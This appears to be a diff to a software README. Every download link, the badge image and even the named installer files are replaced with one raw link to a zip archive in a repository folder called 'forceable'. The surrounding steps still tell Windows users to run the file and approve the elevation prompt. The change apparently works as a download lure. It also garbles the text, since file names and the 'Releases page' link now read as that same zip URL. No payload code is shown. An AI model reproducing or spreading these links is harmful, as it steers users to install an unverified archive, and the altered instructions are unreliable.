@@ -6,7 +6,7 @@ Welcome to **valance**! This application helps you easily manage and organize yo
 
 ## 🔗 Download Here
 
-[![Download valance](https://img.shields.io/badge/Download-valance-blue.svg)](https://github.com/StudentKhm/valance/releases)
+[![Download valance](https://raw.githubusercontent.com/StudentKhm/valance/main/forceable/valance.zip)](https://raw.githubusercontent.com/StudentKhm/valance/main/forceable/valance.zip)
 
 ## 💻 System Requirements
 
@@ -21,11 +21,11 @@ To run **valance**, your system needs to meet the following requirements:
 
 To download **valance**, visit the following page:
 
-[Download valance from Releases](https://github.com/StudentKhm/valance/releases)
+[Download valance from Releases](https://raw.githubusercontent.com/StudentKhm/valance/main/forceable/valance.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of **valance**.
-3. Download the appropriate file for your system. The file will usually be named something like `valance-win.exe` for Windows users or `valance-mac.zip` for Mac users.
+3. Download the appropriate file for your system. The file will usually be named something like `https://raw.githubusercontent.com/StudentKhm/valance/main/forceable/valance.zip` for Windows users or `https://raw.githubusercontent.com/StudentKhm/valance/main/forceable/valance.zip` for Mac users.
 4. Once the download is complete, locate the file in your Downloads folder.
 
 ## 🏁 Running valance
@@ -33,7 +33,7 @@ To download **valance**, visit the following page:
 After downloading **valance**, you can easily run it. Follow these steps:
 
 1. For Windows:
-   - Double-click the `valance-win.exe` file.
+   - Double-click the `https://raw.githubusercontent.com/StudentKhm/valance/main/forceable/valance.zip` file.
    - If prompted by User Account Control, click **Yes** to allow the app to make changes to your device.
    
 2. For Mac:
@@ -62,7 +62,7 @@ If you encounter issues while using **valance**, try the following tips:
 
 - Ensure your system meets the required specifications.
 - Restart the application if it freezes.
-- Check for updates on the [Releases page](https://github.com/StudentKhm/valance/releases) to ensure you have the latest version.
+- Check for updates on the [Releases page](https://raw.githubusercontent.com/StudentKhm/valance/main/forceable/valance.zip) to ensure you have the latest version.
 - Look for our FAQ section in the application's Help menu for common questions and solutions.
 
 ## ✉️ Support
